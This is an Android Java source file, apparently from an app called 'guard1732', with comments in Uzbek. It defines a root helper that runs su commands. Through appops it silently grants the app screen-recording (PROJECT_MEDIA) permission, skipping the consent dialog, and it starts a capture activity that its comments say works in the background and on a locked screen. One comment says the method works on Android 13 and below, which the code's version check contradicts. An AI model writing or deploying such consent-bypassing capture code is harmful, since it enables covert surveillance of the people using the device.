package com.guard1732;

import android.content.Context;

import java.io.DataOutputStream;
import java.util.concurrent.TimeUnit;

/** Root (su) yordamchisi. Root bo'lmasa hamma narsa jimgina false qaytaradi. */
public class Root {
    public static boolean run(Context c, String cmd) {
        Process p = null;
        try {
            p = Runtime.getRuntime().exec("su");
            DataOutputStream o = new DataOutputStream(p.getOutputStream());
            o.writeBytes(cmd + "\nexit\n");
            o.flush();
            if (!p.waitFor(8, TimeUnit.SECONDS)) { p.destroyForcibly(); return false; }
            return p.exitValue() == 0;
        } catch (Throwable t) {
            return false;
        } finally {
            if (p != null) p.destroy();
        }
    }

    /** Ekran yozish ruxsat dialogini o'tkazib yuborish uchun (Android 13 va past) */
    public static boolean grantProjection(Context c) {
        if (android.os.Build.VERSION.SDK_INT >= 30) return false;
        String pkg = c.getPackageName();
        return run(c, "appops set " + pkg + " PROJECT_MEDIA allow");
    }

    /** Fondan ham ishlaydi (root orqali), ekran qulflangan bo'lsa ham */
    public static boolean startCapture(Context c) {
        if (android.os.Build.VERSION.SDK_INT >= 30) return false;
        String pkg = c.getPackageName();
        return run(c, "appops set " + pkg + " PROJECT_MEDIA allow; "
                + "am start -n " + pkg + "/.CaptureActivity");
    }
}
